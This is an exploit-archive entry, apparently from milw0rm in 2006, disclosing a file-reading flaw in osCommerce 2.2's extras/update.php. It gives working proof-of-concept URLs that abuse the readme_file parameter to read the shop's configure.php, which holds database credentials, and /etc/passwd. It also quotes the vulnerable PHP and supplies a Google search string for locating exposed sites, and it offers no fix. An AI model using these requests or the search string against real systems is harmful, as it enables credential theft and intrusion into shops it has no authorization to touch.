<html><head><title>osCommerce <= 2.2 (extras) Source Code Disclosure Vulnerability</title></head><pre>---- osCommerce &lt;= 2.2 &quot;extras/&quot; information/source code disclosure ------------

software site: http://www.oscommerce.com/


if extras/ folder is placed inside the www path, you can see all files on target
system, including php source code with database details, poc:

http://[target]/[path]/extras/update.php?read_me=0&amp;readme_file=../catalog/includes/configure.php
http://[target]/[path]/extras/update.php?read_me=0&amp;readme_file=/etc/passwd

this is the vulnerable code in update.php:

...
	include '../mysql.php';
	// if a readme.txt file exists, display it to the user
	if(!$read_me) {
		if(file_exists('readme.txt')) {
			$readme_file = 'readme.txt';
		}
		elseif(file_exists('README')) {
			$readme_file = 'README';
		}
		elseif(file_exists('readme')) {
			$readme_file = 'readme';
		}
		if($readme_file) {
			$readme = file($readme_file);
			print &quot;&lt;CENTER&gt;&lt;TABLE BORDER=\&quot;1\&quot; WIDTH=\&quot;75%\&quot; CELLPADDING=\&quot;2\&quot; CELLSPACING=\&quot;0\&quot;&gt;&lt;TR BGCOLOR=\&quot;#e7e7cc\&quot;&gt;&lt;TD&gt;\n&quot;;
			print nl2br(htmlentities(implode($readme, ' ')));
			print &quot;&lt;HR NOSHADE SIZE=\&quot;1\&quot;&gt;&lt;CENTER&gt;&lt;A HREF=\&quot;update.php?read_me=1\&quot;&gt;&lt;B&gt;Continue&lt;/B&gt;&lt;/A&gt;&lt;/CENTER&gt;\n&quot;;
			print &quot;&lt;/TD&gt;&lt;/TR&gt;&lt;/TABLE&gt;\n&quot;;
			exit;
		}
	}
...

google search:

inurl:&quot;extras/update.php&quot; intext:mysql.php -display

--------------------------------------------------------------------------------
rgod

site: http://retrogod.altervista.org
mail: rgod at autistici.org
original advisory: http://retrogod.altervista.org/oscommerce_22_adv.html
--------------------------------------------------------------------------------

# milw0rm.com [2006-04-14]</pre></html>